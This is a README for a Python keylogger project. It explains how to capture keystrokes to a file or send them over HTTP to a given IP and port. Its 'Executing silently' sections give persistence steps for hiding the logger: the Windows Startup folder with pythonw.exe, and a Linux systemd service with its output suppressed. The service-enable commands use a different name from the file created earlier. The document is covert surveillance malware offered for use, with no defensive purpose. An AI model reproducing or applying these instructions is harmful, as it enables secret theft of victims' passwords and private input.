# keylogger-py

## About

Simple python keylogger that works with file storaging or send the content via http.

## Prerequisites

```sh
pip install pynput
```

```sh
pip install requests
```

## Execute

- Windows

```sh
py .\keylogger.py --mode file --ip 127.0.0.251 --port 8080
```

- Linux

```sh
python keylogger.py
```

```sh
python3 keylogger.py
```

- If you dont have permissions to execute the file

```sh
chmod +x keylogger.py
```

## Executing silently (Windows)

- Press Win + R, type shell:startup, and hit Enter. This opens the Startup folder.
- Move the shortcut you created into the Startup folder.
- Edit the shortcut you just moved by right-clicking on it and selecting Properties.
- In the Target field, add the following before the script's path: **pythonw.exe**

- The target should look something like this: **pythonw.exe "C:\path\keylogger.py"**

## Executing silently (Linux)

- Create a service file

```sh
sudo nano /etc/systemd/system/keylogger.service
```

- Service file content

```
[Unit]
Description=My Script Service

[Service]
ExecStart=/usr/bin/python3 /path/to/your/script.py
StandardOutput=null
StandardError=null
Type=simple

[Install]
WantedBy=multi-user.target
```

- Enable the service

```sh
sudo systemctl enable myscript.service
sudo systemctl start myscript.service
```

## Contribution

- The project accepts contribution. Open a Pull Request and I'll review it.
